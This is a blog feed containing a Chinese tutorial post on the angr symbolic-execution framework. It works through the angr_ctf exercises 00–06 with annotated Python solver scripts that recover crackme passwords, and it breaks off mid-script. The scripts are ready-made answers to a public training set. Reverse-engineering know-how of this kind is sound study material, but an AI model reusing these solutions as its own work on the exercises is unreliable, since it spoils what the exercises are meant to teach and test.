<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Whali3n51&#39;s blog</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://whali3n51.top/"/>
  <updated>2022-05-26T08:51:33.789Z</updated>
  <id>http://whali3n51.top/</id>
  
  <author>
    <name>Whali3n51</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Angr笔记</title>
    <link href="http://whali3n51.top/2022/05/18/AngrNote/"/>
    <id>http://whali3n51.top/2022/05/18/AngrNote/</id>
    <published>2022-05-18T11:34:05.000Z</published>
    <updated>2022-05-26T08:51:33.789Z</updated>
    
    <content type="html"><![CDATA[<p>本文是学习<a href="https://github.com/jakespringer/angr_ctf" target="_blank" rel="noopener">angr_ctf</a>所写。这里是我的一点总结和想法。</p><h2><span id="安装angr">安装angr</span></h2><p>我安装的环境是ubuntu20.04+python3。首先安装python,确保python默认为python3而不是python2。这个问题在ubuntu20.04上面有体现。如果出现默认python是python2，建议先卸载python2，等python3的虚拟环境安装完成之后再重新安装python2。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get autoremove --purge python2* <span class="comment">#卸载python2</span></span><br><span class="line"><span class="comment">#进入/usr/bin目录给python3创建个软链接，这样默认python就是python3了</span></span><br><span class="line"><span class="built_in">cd</span> /usr/bin</span><br><span class="line">ln -s /usr/bin/python3.8 python</span><br></pre></td></tr></table></figure><p>接下来就是安装虚拟环境。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install python-dev libffi-dev build-essential <span class="comment">#安装依赖</span></span><br><span class="line">pip3 install virtualenvwrapper</span><br></pre></td></tr></table></figure><p>设置环境变量</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> WORKON_HOME=<span class="variable">$HOME</span>/Python-workhome</span><br><span class="line"><span class="built_in">source</span> /usr/<span class="built_in">local</span>/bin/virtualenvwrapper.sh</span><br></pre></td></tr></table></figure><p>这里<code>source /usr/local/bin/virtualenvwrapper.sh</code>执行如果报错为没有找到文件，建议找一下自己的virtualenvwrapper安装目录。如果报错为没有模块的话，建议检查一下自己默认python是否为python3。如果这两步执行没有错误的话，建议写入~/.bashrc中，这样就不用每次启动bash都要输入一次。</p><p>接下来就是进入虚拟环境安装angr</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mkvirtualenv virangr</span><br><span class="line">workon <span class="comment">#查看目前所在虚拟环境</span></span><br><span class="line">pip3 install angr</span><br></pre></td></tr></table></figure><p>如此angr就安装上了，可以正常使用了。后续python2安装上也不影响使用。只要保证默认python是python3即可。</p><h2><span id="angr笔记">angr笔记</span></h2><p>本文所有程序全部是需要输入密码，然后判断密码是否正确，不同题目难度各异，依次递增。输入正确回显为”Good Job.”,反之则为”Try again.”</p><h3><span id="00_angr_find">00_angr_find</span></h3><p>这个例子就是angr的开端，脚本并不复杂，简单介绍一下angr的思路。angr为符号执行，在不运行程序的情况下，通过分析程序，计算出一系列的输入，这个输入可以使程序跑到你想要达到的特定位置。例如，在本题中，输入一串正确的字符串来使程序输出”Good Job.”。因此在程序里面输出”Good Job.”的地方就是我们想要达到的地方。angr通过你指定的参数脚本内容在不运行程序的情况下来计算出正确的输入字符串。</p><p>本题较为简单，主要目的是介绍一下angr脚本的初始框架，以后大致是在此基础上进行修修改改。</p><p>看题</p><p><img src="1.png" alt></p><p>要想得到这个正确的password，通常我们的思路就是对complex_function进行一个常规的逆向。但是学习了angr之后并不需要这么做，complex_function可以使用angr自动分析。如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">(argv)</span>:</span></span><br><span class="line">  <span class="comment">#简单创建一个angr的一个工程，指明需要分析的程序</span></span><br><span class="line">  path_to_binary = <span class="string">r'00_angr_find'</span>  <span class="comment"># :string</span></span><br><span class="line">  project = angr.Project(path_to_binary)</span><br><span class="line">  <span class="comment">#指定分析程序的起始地址，entry_state()为程序默认起始地址</span></span><br><span class="line">  initial_state = project.factory.entry_state()</span><br><span class="line">  <span class="comment">#根据指定的入口地址创建一个模拟器</span></span><br><span class="line">  simulation = project.factory.simgr(initial_state)</span><br><span class="line">  <span class="comment">#指定想要达到的地址，这里为0x804867D就是程序执行到puts("Good Job.")的地址。</span></span><br><span class="line">  print_good_address = <span class="number">0x804867D</span>   <span class="comment"># :integer (probably in hexadecimal)</span></span><br><span class="line">  <span class="comment">#根据通过初始化的模拟器计算出想要到达地址的输入。</span></span><br><span class="line">  simulation.explore(find=print_good_address)</span><br><span class="line">  <span class="comment">#找到正确的输入就打印</span></span><br><span class="line">  <span class="keyword">if</span> simulation.found:</span><br><span class="line">    <span class="comment">#正确的模拟路径不止一个，这里只选择第一个。</span></span><br><span class="line">    solution_state = simulation.found[<span class="number">0</span>]</span><br><span class="line">    <span class="comment">#打印出该次模拟器模拟路径的输入，即正确输入</span></span><br><span class="line">    print(solution_state.posix.dumps(sys.stdin.fileno()))</span><br><span class="line">  <span class="keyword">else</span>:</span><br><span class="line">    <span class="comment">#没找到就抛异常</span></span><br><span class="line">    <span class="keyword">raise</span> Exception(<span class="string">'Could not find the solution'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">  main(sys.argv)</span><br></pre></td></tr></table></figure><p>框架很简单，angr分析程序大致流程也就这样。</p><h3><span id="01_angr_avoid">01_angr_avoid</span></h3><p>介绍了不想进入的分支的angr设置。如题</p><p><img src="2.png" alt></p><p><img src="3.png" alt></p><p><img src="4.png" alt></p><p>本题main函数分支十分庞大，同时要想正确的输出”Good Job.”不能进去一次avoid_me函数。因此需要在angr中设置不想进入的地方。如果设置该字段，如果模拟器分析到该地方则会跳过该次分析，进行下一次分析。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">(argv)</span>:</span></span><br><span class="line">  path_to_binary = <span class="string">r"01_angr_avoid"</span></span><br><span class="line">  project = angr.Project(path_to_binary)</span><br><span class="line">  initial_state = project.factory.entry_state()</span><br><span class="line">  simulation = project.factory.simgr(initial_state)</span><br><span class="line">  print_good_address = <span class="number">0x80485E5</span></span><br><span class="line">  will_not_succeed_address = <span class="number">0x80485A8</span></span><br><span class="line">  <span class="comment">#增加了avoid,设置该参数则分析的时候到该地方则会结束该次分析，进行下一次分析。</span></span><br><span class="line">  simulation.explore(find=print_good_address, avoid=will_not_succeed_address)</span><br><span class="line">  <span class="keyword">if</span> simulation.found:</span><br><span class="line">    solution_state = simulation.found[<span class="number">0</span>]</span><br><span class="line">    print(solution_state.posix.dumps(sys.stdin.fileno()))</span><br><span class="line">  <span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">raise</span> Exception(<span class="string">'Could not find the solution'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">  main(sys.argv)</span><br></pre></td></tr></table></figure><h3><span id="02_angr_find_condition">02_angr_find_condition</span></h3><p>本题介绍了不知道正确地址的程序该如何使用。如果本题不知道打印”Good Job.”的地址，那么该怎么办？</p><p>本题介绍了simulation.explore(find=True,avoid=False). find和avoid参数不仅仅可以是函数地址，还可以是Boolean。当find=True时，证明本次分析成功。avoid=True时，则跳过该次分析，进入下一次分析。</p><p><img src="5.png" alt></p><p>此时我们只需要判断什么时候给find为True,什么时候给avoid为True.如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">(argv)</span>:</span></span><br><span class="line">  path_to_binary = argv[<span class="number">1</span>]</span><br><span class="line">  project = angr.Project(path_to_binary)</span><br><span class="line">  initial_state = project.factory.entry_state()</span><br><span class="line">  simulation = project.factory.simgr(initial_state)</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">is_successful</span><span class="params">(state)</span>:</span></span><br><span class="line">    <span class="comment">#可以通过获取程序的打印结果来判断是否执行成功</span></span><br><span class="line">    stdout_output = state.posix.dumps(sys.stdout.fileno())</span><br><span class="line">    <span class="comment">#打印结果含有'Good Job.',则给find返回True</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">b'Good Job.'</span> <span class="keyword">in</span> stdout_output</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">should_abort</span><span class="params">(state)</span>:</span></span><br><span class="line">    stdout_output = state.posix.dumps(sys.stdout.fileno())</span><br><span class="line">    <span class="comment">#打印结果含有'Good Job.',则给avoid返回True</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">b"Try again."</span> <span class="keyword">in</span> stdout_output</span><br><span class="line">  </span><br><span class="line">  simulation.explore(find=is_successful, avoid=should_abort)</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">if</span> simulation.found:</span><br><span class="line">    solution_state = simulation.found[<span class="number">0</span>]</span><br><span class="line">    print(solution_state.posix.dumps(sys.stdin.fileno()))</span><br><span class="line">  <span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">raise</span> Exception(<span class="string">'Could not find the solution'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">  main(sys.argv)</span><br></pre></td></tr></table></figure><h3><span id="小总结01">小总结01</span></h3><p>如上三个题都是针对 simulation.explore()函数。想要找到的地址就设置给find或者想要得到的输出得到之后就给find设置为True.想要避免的函数地址就设置给avoid或者不想得到的输出得到之后给avoid设置为True.</p><h3><span id="03_angr_symbolic_registers">03_angr_symbolic_registers</span></h3><p>前三题都是只用一次输入一个字符串，本题引入一次输入多个输入变量。angr简单的处理不了一次输入多个变量输入，只能简单处理单个变量。因此这里介绍angr处理多个变量.</p><p><img src="6.png" alt></p><p>​    <img src="7.png" alt></p><p><img src="9.png" alt></p><p><img src="10.png" alt></p><p>如题本题在get_user_input函数中需要输入三个数据，输入的数据存放在eax,ebx,edx中。三个参数进入三个不同的complex_function。angr的处理方式如下。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> claripy</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">(argv)</span>:</span></span><br><span class="line">  path_to_binary = argv[<span class="number">1</span>]</span><br><span class="line">  project = angr.Project(path_to_binary)</span><br><span class="line">  <span class="comment">#这里不能从程序起始地址开始，需要跳过函数输入的地方开始，然后采用符号插入的方式告诉angr输入变量。</span></span><br><span class="line">  start_address = <span class="number">0x8048980</span>   <span class="comment"># :integer (probably hexadecimal)</span></span><br><span class="line">  <span class="comment">#注意这里是blank_state</span></span><br><span class="line">  initial_state = project.factory.blank_state(addr=start_address)</span><br><span class="line">  <span class="comment">#指定输入变量的变量占用bit数，多个变量就类似设置。这里有三个变量就设置三个</span></span><br><span class="line">  password0_size_in_bits = <span class="number">32</span>  <span class="comment"># :integer</span></span><br><span class="line">  <span class="comment">#创建位向量，angr通过改变该变量来模拟出正确的结果，</span></span><br><span class="line">  <span class="comment">#第一个参数仅仅是一个angr引用的名字而已，随便取，建议别重复。</span></span><br><span class="line">  password0 = claripy.BVS(<span class="string">'password0'</span>, password0_size_in_bits)</span><br><span class="line">  password1_size_in_bits = <span class="number">32</span>  <span class="comment"># :integer</span></span><br><span class="line">  password1 = claripy.BVS(<span class="string">'password1'</span>, password1_size_in_bits)</span><br><span class="line">  password2_size_in_bits = <span class="number">32</span>  <span class="comment"># :integer</span></span><br><span class="line">  password2 = claripy.BVS(<span class="string">'password2'</span>, password2_size_in_bits)</span><br><span class="line"></span><br><span class="line">  <span class="comment">#这里进行符号插入，三个输入变量都是存放在寄存器，则使之一一对应。</span></span><br><span class="line">  initial_state.regs.eax = password0</span><br><span class="line">  initial_state.regs.ebx = password1</span><br><span class="line">  initial_state.regs.edx = password2</span><br><span class="line"></span><br><span class="line">  simulation = project.factory.simgr(initial_state)</span><br><span class="line">  <span class="comment">#和题02一样</span></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">is_successful</span><span class="params">(state)</span>:</span></span><br><span class="line">    stdout_output = state.posix.dumps(sys.stdout.fileno())</span><br><span class="line">    <span class="keyword">return</span> <span class="string">b'Good Job.'</span> <span class="keyword">in</span> stdout_output</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">should_abort</span><span class="params">(state)</span>:</span></span><br><span class="line">    stdout_output = state.posix.dumps(sys.stdout.fileno())</span><br><span class="line">    <span class="keyword">return</span> <span class="string">b"Try again."</span> <span class="keyword">in</span> stdout_output</span><br><span class="line"></span><br><span class="line">  simulation.explore(find=is_successful, avoid=should_abort)</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> simulation.found:</span><br><span class="line">    solution_state = simulation.found[<span class="number">0</span>]</span><br><span class="line">    <span class="comment">#处理之后得到的值有多个，使用eval函数，只保留一个</span></span><br><span class="line">    solution0 = solution_state.se.eval(password0)</span><br><span class="line">    solution1 = solution_state.se.eval(password1)</span><br><span class="line">    solution2 = solution_state.se.eval(password2)</span><br><span class="line">    <span class="comment">#将值按照输入的格式打印出来</span></span><br><span class="line">    solution = <span class="string">r"%x %x %x"</span>%(solution0,solution1,solution2)  <span class="comment"># :string</span></span><br><span class="line">    print(solution)</span><br><span class="line">  <span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">raise</span> Exception(<span class="string">'Could not find the solution'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">  main(sys.argv)</span><br></pre></td></tr></table></figure><h3><span id="04_angr_symbolic_stack">04_angr_symbolic_stack</span></h3><p>本题和上题类似，但是这次输入的变量是存放在栈上。</p><p><img src="8.png" alt></p><p><img src="11.png" alt></p><p>可以从汇编上看到，通过scanf输入的两个变量一个存放在距离栈底0xc的地方，一个存放在距离占地0x10的地方。angr处理如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> claripy</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">(argv)</span>:</span></span><br><span class="line">  path_to_binary = argv[<span class="number">1</span>]</span><br><span class="line">  project = angr.Project(path_to_binary)</span><br><span class="line">  <span class="comment">#这里开始位置很重要，开始位置决定了栈空间</span></span><br><span class="line">  <span class="comment">#我们这里还是需要在scanf后面调用，但是是在0x8048694还是0x8048697.</span></span><br><span class="line">  <span class="comment">#若是在0x8048694，这个汇编调用其实是在平衡scanf的参数调用栈的</span></span><br><span class="line">  <span class="comment">#angr分析时构造的栈就会比原程序的栈向下偏移0x10</span></span><br><span class="line">  <span class="comment">#因此我们需要从0x8048697开始，使之布局与原程序一致。</span></span><br><span class="line">  start_address = <span class="number">0x8048697</span></span><br><span class="line">  initial_state = project.factory.blank_state(addr=start_address)</span><br><span class="line">  <span class="comment">#初始化栈</span></span><br><span class="line">  initial_state.regs.ebp = initial_state.regs.esp</span><br><span class="line">  <span class="comment">#如题03</span></span><br><span class="line">  password0 = claripy.BVS(<span class="string">'password0'</span>, <span class="number">32</span>)</span><br><span class="line">  password1 = claripy.BVS(<span class="string">'password1'</span>, <span class="number">32</span>)</span><br><span class="line">  <span class="comment">#这里计算出填充字符，使构造栈布局与程序栈布局类似</span></span><br><span class="line">  <span class="comment">#关键是让输入变量存放的栈与构造出来的栈布局对应上</span></span><br><span class="line">  padding_length_in_bytes = <span class="number">0x8</span>  <span class="comment"># :integer</span></span><br><span class="line">  initial_state.regs.esp -= padding_length_in_bytes</span><br><span class="line">  <span class="comment">#当构造栈向上抬了0x8个字节后，再push一个4个字节大小的angr变量就与存放在0xc的输入变量对应上了</span></span><br><span class="line">  initial_state.stack_push(password0)  <span class="comment"># :bitvector (claripy.BVS, claripy.BVV, claripy.BV)</span></span><br><span class="line">  <span class="comment">#同理在push一个4个字节大小的angr变量就与存放在0x10的输入变量对应上了</span></span><br><span class="line">  initial_state.stack_push(password1)</span><br><span class="line"></span><br><span class="line">  <span class="comment">#如下就与题03类似了</span></span><br><span class="line">  simulation = project.factory.simgr(initial_state)</span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">is_successful</span><span class="params">(state)</span>:</span></span><br><span class="line">    stdout_output = state.posix.dumps(sys.stdout.fileno())</span><br><span class="line">    <span class="keyword">return</span> <span class="string">b'Good Job.'</span> <span class="keyword">in</span> stdout_output</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">should_abort</span><span class="params">(state)</span>:</span></span><br><span class="line">    stdout_output = state.posix.dumps(sys.stdout.fileno())</span><br><span class="line">    <span class="keyword">return</span> <span class="string">b"Try again."</span> <span class="keyword">in</span> stdout_output</span><br><span class="line"></span><br><span class="line">  simulation.explore(find=is_successful, avoid=should_abort)</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> simulation.found:</span><br><span class="line">    solution_state = simulation.found[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">    solution0 = solution_state.se.eval(password0)</span><br><span class="line">    solution1 = solution_state.se.eval(password1)</span><br><span class="line"></span><br><span class="line">    solution = <span class="string">r"%u %u"</span>%(solution0,solution1)</span><br><span class="line">    print(solution)</span><br><span class="line">  <span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">raise</span> Exception(<span class="string">'Could not find the solution'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">  main(sys.argv)</span><br></pre></td></tr></table></figure><p>本题关键就是要定位好原程序存放输入的变量与我们构造的位向量在栈上的位置保持一致，以便模拟器正确的计算出来正确的输入值。</p><h3><span id="05_angr_symbolic_memory">05_angr_symbolic_memory</span></h3><p>本题的存放输入的变量存放在bss段上</p><p><img src="12.png" alt></p><p>本题较为简单，只需要找到变量输入地址即可。存放在bss段，则地址固定，angr处理如下。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> claripy</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">(argv)</span>:</span></span><br><span class="line">  path_to_binary = argv[<span class="number">1</span>]</span><br><span class="line">  project = angr.Project(path_to_binary)</span><br><span class="line"></span><br><span class="line">  start_address = <span class="number">0x8048601</span> </span><br><span class="line">  initial_state = project.factory.blank_state(addr=start_address)</span><br><span class="line">  <span class="comment">#每个变量需要输入八个字节，因此8*8=64</span></span><br><span class="line">  <span class="comment">#创建位向量</span></span><br><span class="line">  password0 = claripy.BVS(<span class="string">'password0'</span>, <span class="number">64</span>)</span><br><span class="line">  password1 = claripy.BVS(<span class="string">'password1'</span>, <span class="number">64</span>)</span><br><span class="line">  password2 = claripy.BVS(<span class="string">'password2'</span>, <span class="number">64</span>)</span><br><span class="line">  password3 = claripy.BVS(<span class="string">'password3'</span>, <span class="number">64</span>)</span><br><span class="line"></span><br><span class="line">  <span class="comment">#通过memory.store()可以将angr变量与地址绑定</span></span><br><span class="line">  password0_address = <span class="number">0xA1BA1C0</span></span><br><span class="line">  initial_state.memory.store(password0_address, password0)</span><br><span class="line">  password1_address = <span class="number">0xA1BA1C8</span></span><br><span class="line">  initial_state.memory.store(password1_address, password1)</span><br><span class="line">  password2_address = <span class="number">0xA1BA1D0</span></span><br><span class="line">  initial_state.memory.store(password2_address, password2)</span><br><span class="line">  password3_address = <span class="number">0xA1BA1D8</span></span><br><span class="line">  initial_state.memory.store(password3_address, password3)</span><br><span class="line"></span><br><span class="line">  <span class="comment">#如下处理一致</span></span><br><span class="line">  simulation = project.factory.simgr(initial_state)</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">is_successful</span><span class="params">(state)</span>:</span></span><br><span class="line">    stdout_output = state.posix.dumps(sys.stdout.fileno())</span><br><span class="line">    <span class="keyword">return</span> <span class="string">b"Good Job."</span> <span class="keyword">in</span> stdout_output</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">should_abort</span><span class="params">(state)</span>:</span></span><br><span class="line">    stdout_output = state.posix.dumps(sys.stdout.fileno())</span><br><span class="line">    <span class="keyword">return</span> <span class="string">b"Try again."</span> <span class="keyword">in</span> stdout_output</span><br><span class="line"></span><br><span class="line">  simulation.explore(find=is_successful, avoid=should_abort)</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> simulation.found:</span><br><span class="line">    solution_state = simulation.found[<span class="number">0</span>]</span><br><span class="line">    <span class="comment">#这里需要把正确结果处理为字符串输出</span></span><br><span class="line">    solution0 = solution_state.solver.eval(password0,cast_to=bytes).decode(<span class="string">'utf-8'</span>)</span><br><span class="line">    solution1 = solution_state.solver.eval(password1,cast_to=bytes).decode(<span class="string">'utf-8'</span>)</span><br><span class="line">    solution2 = solution_state.solver.eval(password2,cast_to=bytes).decode(<span class="string">'utf-8'</span>)</span><br><span class="line">    solution3 = solution_state.solver.eval(password3,cast_to=bytes).decode(<span class="string">'utf-8'</span>)</span><br><span class="line">    solution = <span class="string">r"%8s %8s %8s %8s"</span>%(solution0,solution1,solution2,solution3)</span><br><span class="line">    print(solution)</span><br><span class="line">  <span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">raise</span> Exception(<span class="string">'Could not find the solution'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">  main(sys.argv)</span><br></pre></td></tr></table></figure><h3><span id="06_angr_symbolic_dynamic_memory">06_angr_symbolic_dynamic_memory</span></h3><p><img src="13.png" alt></p><p>两个输入变量在堆上，地址随机。angr需要使用任意一个无用已知的内存块并且用这内存块地址覆盖指向原来数据内存的指针，这样就无需知道malloc分配的随机地址了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> claripy</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span 